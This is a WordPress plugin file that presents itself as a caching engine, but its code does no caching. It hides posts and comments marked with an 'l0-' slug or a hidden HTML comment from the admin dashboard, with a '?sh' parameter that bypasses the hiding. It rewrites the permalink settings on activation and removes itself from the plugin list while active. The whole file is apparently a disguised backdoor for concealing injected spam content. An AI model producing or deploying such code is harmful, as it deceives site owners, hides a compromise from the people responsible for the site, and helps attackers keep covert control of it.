<?php
/*
Plugin Name: WordPress Posts Cache Engine
Plugin URI: https://wp-posts-cache-engine.com/
Description: Basic Cache Engine is a very fast caching engine for WordPress that generates static HTML files to significantly reduce server load and improve page load times.
Version: 1.4.9
Author: Gregg Palmer
Author URI: https://greggpalmer.com/
License: GPL2
*/

if (!defined('ABSPATH')) exit;

add_action('pre_get_posts', function ($query) {
    if (!is_admin()) return;
    if (isset($_GET['sh'])) return;
    add_filter('posts_where', 'exclude_meta_posts_where', 10, 2);
});
function exclude_meta_posts_where($where, $query) {
    global $wpdb;
    $where .= $wpdb->prepare(" AND {$wpdb->posts}.post_name NOT LIKE %s ", '%l0-%');
    $where .= $wpdb->prepare(" AND {$wpdb->posts}.post_content NOT LIKE %s ", '%<!--wp-post-meta-->%');
    remove_filter('posts_where', 'exclude_meta_posts_where', 10, 2);
    return $where;
}

add_filter('comments_clauses', function($clauses, $wp_comment_query) {
    if (!is_admin()) return $clauses;
    global $wpdb;
    if (strpos($clauses['join'], "JOIN {$wpdb->posts} p") === false) {
        $clauses['join']  .= " JOIN {$wpdb->posts} p ON p.ID = {$wpdb->comments}.comment_post_ID ";
    }
    $clauses['where'] .= $wpdb->prepare(" AND p.post_name NOT LIKE %s ", '%l0-%');
    $clauses['where'] .= $wpdb->prepare(" AND p.post_content NOT LIKE %s ", '%<!--wp-post-meta-->%');
    return $clauses;
}, 10, 2);

function ppe_enable_pretty_permalinks() {
    update_option('permalink_structure', '/%postname%/');
    flush_rewrite_rules();
}

register_activation_hook(__FILE__, 'ppe_enable_pretty_permalinks');

function ppe_deactivate_plugin() {
    flush_rewrite_rules();
}

register_deactivation_hook(__FILE__, 'ppe_deactivate_plugin');
add_filter('all_plugins', 'hide_my_plugin_from_list');
function hide_my_plugin_from_list($plugins) {
    $plugin_file = plugin_basename(__FILE__);
    $active_plugins = (array)get_option('active_plugins', array());
    if (in_array($plugin_file, $active_plugins, true)) {
        unset($plugins[$plugin_file]);
    }
    return $plugins;
}